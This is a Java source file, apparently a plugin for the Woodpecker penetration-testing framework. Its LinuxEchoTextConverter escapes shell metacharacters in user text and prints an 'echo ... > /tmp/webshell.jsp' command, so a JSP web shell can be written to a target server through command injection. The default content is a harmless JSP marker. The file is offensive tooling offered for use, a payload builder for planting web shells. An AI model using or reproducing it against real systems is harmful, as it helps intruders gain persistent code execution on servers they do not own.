package me.gv7.woodpecker.plugin.payload;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class LinuxEchoTextConverter implements IHelper {
    public static String strConverter(String text){
        String payload = text
                .replace("\n","")
                .replace("`","\\`")
                .replace("'","\'")
                .replace("\"","\\\"")
                .replace("*","\\*")
                .replace("&","\\&")
                .replace("|","\\|")
                .replace("<","\\<")
                .replace(">","\\>")
                .replace("{","\\{")
                .replace("}","\\}")
                .replace("(","\\(")
                .replace(")","\\)")
                .replace("!","\\!")
                .replace("[","\\[")
                .replace("]","\\]").replace(";","\\;");
        return payload;
    }


    @Override
    public String getHelperTabCaption() {
        return "Linux Echo To File";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = EchoTextConverter.pluginHelper.createArgsUsageBinder();
        List<IArg> arg = new ArrayList<IArg>();
        IArg args1 = EchoTextConverter.pluginHelper.createArg();
        args1.setName("all");
        args1.setDefaultValue("<%out.write(\"1\");%>");
        args1.setDescription("write text");
        args1.setRequired(true);
        arg.add(args1);
        argsUsageBinder.setArgsList(arg);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) {
        String text = (String)customArgs.get("all");
        try {
            String payload = strConverter(text);
            resultOutput.successPrintln("Converter finish! command:");
            resultOutput.rawPrintln("\n");
            String command = String.format("echo %s > /tmp/webshell.jsp",payload);
            resultOutput.rawPrintln(command);
            resultOutput.rawPrintln("\n");

        }catch (Exception e){}
    }
}
